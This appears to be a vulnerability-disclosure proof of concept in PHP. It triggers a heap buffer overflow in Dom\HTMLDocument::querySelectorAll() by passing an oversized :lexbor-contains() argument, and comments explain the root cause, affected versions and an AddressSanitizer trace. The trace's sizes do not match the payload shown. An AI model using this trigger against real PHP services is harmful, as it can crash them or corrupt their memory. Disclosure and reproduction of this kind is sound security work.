<?php
/**
 * Heap Buffer Overflow in PHP Dom\HTMLDocument::querySelectorAll()
 * via bundled lexbor CSS selector :lexbor-contains() parsing
 *
 * ROOT CAUSE
 * ----------
 * File: ext/dom/lexbor/lexbor/css/selectors/pseudo_state.c
 * Function: lxb_css_selectors_state_pseudo_class_function_lexbor_contains()
 *
 * When parsing the :lexbor-contains("string") CSS pseudo-class function,
 * the string content buffer is allocated as sizeof(lexbor_str_t) bytes (16 bytes
 * on 64-bit platforms: sizeof(lxb_char_t*) + sizeof(size_t)). The actual string
 * content is then copied with memcpy(str->data, data, length + 1), where length
 * can be any arbitrary length supplied by the attacker.
 *
 * Any :lexbor-contains() argument longer than 15 bytes overflows the 16-byte
 * allocation, writing past the end of the mraw pool chunk into adjacent memory.
 *
 * AFFECTED VERSIONS
 * -----------------
 * PHP 8.4.x with lexbor 2.7.0 integrated (before 8.4.28)
 * Fixed in: PHP 8.4.28 (unreleased as of 2026-10-21)
 *
 * IMPACT
 * ------
 * - Heap buffer overflow with attacker-controlled write size
 * - Write of up to length+1 bytes past a 16-byte heap allocation
 * - Corrupts adjacent mraw pool data; overflows pool chunk (malloc'd) boundary
 * - Reachable from untrusted input via querySelectorAll() / querySelector()
 * - In web applications parsing HTML from user input with DOM selectors: RCE potential
 *
 * ASAN CONFIRMATION
 * -----------------
 * =================================================================
 * ==88658==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x62100001dd08
 * WRITE of size 6145 at 0x62100001dd08 thread T0
 *     #0 0x000104102bb0 in __asan_memcpy
 *     #1 0x0001025992d8 in lxb_css_selectors_state_pseudo_class_function_lexbor_contains
 *        pseudo_state.c:235
 *     #2 0x0001025aa254 in lxb_css_syntax_parser_run parser.c:269
 *     #3 0x00010259f490 in lxb_css_selectors_parse_list selectors.c:259
 *     #4 0x0001025253a4 in dom_parse_selector css_selectors.c:93
 *     #5 0x000102524914 in dom_query_selector_common css_selectors.c:140
 * 0x62100001dd08 is located 0 bytes after 4104-byte region
 * SUMMARY: heap-buffer-overflow pseudo_state.c:235 in
 *     lxb_css_selectors_state_pseudo_class_function_lexbor_contains
 */

$doc = Dom\HTMLDocument::createFromString(
    '<html><body><p class="test">Hello world</p></body></html>',
    LIBXML_NOERROR
);

// Any string argument longer than sizeof(lexbor_str_t) = 16 bytes triggers overflow
// The vulnerable code: str->data = lexbor_mraw_alloc(mraw, sizeof(lexbor_str_t));  // 16 bytes
//                      memcpy(str->data, data, length + 1);                         // overflow

$payload = str_repeat('A', 1024); // 1024 bytes → overflow by 1009 bytes past 16-byte alloc
echo "Triggering :lexbor-contains() heap overflow with " . strlen($payload) . "-byte argument...\n";

// querySelectorAll passes the CSS selector to the lexbor CSS parser
// The :lexbor-contains() handler allocates sizeof(lexbor_str_t)=16 bytes
// then copies strlen($payload)+1 bytes → heap-buffer-overflow
$result = $doc->querySelectorAll(':lexbor-contains("' . $payload . '")');
echo "Result: " . $result->length . " nodes\n";
echo "If no crash: rebuild PHP with ASAN (./configure --enable-address-sanitizer)\n";
echo "Expected: AddressSanitizer: heap-buffer-overflow in\n";
echo "          lxb_css_selectors_state_pseudo_class_function_lexbor_contains\n";
